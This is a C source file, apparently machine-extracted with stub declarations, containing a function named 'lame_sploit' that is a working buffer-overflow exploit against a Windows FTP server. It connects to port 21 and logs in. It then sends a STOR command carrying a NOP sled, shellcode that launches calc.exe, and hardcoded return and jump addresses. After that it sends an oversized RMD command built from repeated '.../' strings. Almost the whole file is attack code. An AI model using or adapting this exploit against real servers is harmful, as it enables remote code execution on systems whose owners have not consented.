
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int tmp ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int buf ;
typedef int WSADATA ;
typedef int WORD ;


 int AF_INET ;
 int ExitProcess (int) ;
 int MAKEWORD (int,int) ;
 int SOCK_STREAM ;
 int WSAStartup (int ,int *) ;
 int _snprintf (char*,int,char*,char*) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 char* fzz_recv (int) ;
 int htons (int) ;
 int inet_addr (char*) ;
 int login (int,char*,char*) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 int printf (char*,...) ;
 int send (int,char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int strcat (char*,char*) ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;

void lame_sploit (char *pack, char *user, char *pass)
{
 WORD wVersionRequested;
 WSADATA wsaData;
 int sock, err,x;
 struct sockaddr_in sin;
 char buf[2000],tmp[1000];


 char *shell=
  "\x33\xc0"
  "\x50"
  "\x68\x2e\x65\x78\x65"
  "\x68\x63\x61\x6c\x63"
  "\x54"
  "\xba\x44\x80\xc2\x77"
  "\xff\xd2";


 wVersionRequested = MAKEWORD( 2, 2 );
 err = WSAStartup( wVersionRequested, &wsaData );
 if ( err != 0 ) {
  printf ("ERROR: Sorry, cannot create socket!!!\n");
  ExitProcess(-1);
 }

 sock=socket(AF_INET,SOCK_STREAM,0);


 sin.sin_family=AF_INET;
 sin.sin_addr.s_addr = inet_addr(pack);
 sin.sin_port = htons(21);

 if (connect(sock,(struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) {
  printf ("CONNECT :(((\n");
  ExitProcess(-1);
 }

 if (login(sock,user,pass) == -1)
 {
  printf ("ERROR: Cannot login to FTP server, sorry!!!\n");
  exit(-1);
 }

 memset(tmp,0,sizeof(tmp));
 memset (tmp,0x90,180);


 memcpy (&tmp[80],shell,strlen(shell));
 *(long*)&tmp[158] = 0x77da52b8;
 *(long*)&tmp[166] = 0x74ec8390;
 *(long*)&tmp[170] = 0x9090e4ff;


 _snprintf (buf,sizeof(buf),"STOR %s\r\n", tmp);

 printf ("DEBUG: %.30s %d\n",buf,strlen(buf));
 send (sock,buf,strlen(buf),0);
 printf ("%s\n",fzz_recv(sock));

 strcpy(buf,"RMD ");
 for (x=0;x<276;x++)
  strcat (buf,".../");
 strcat(buf,"\r\n");

 printf ("Sending exploit strings\n");
 send (sock,buf,strlen(buf),0);
 printf ("recv: %s\n",fzz_recv(sock));


}
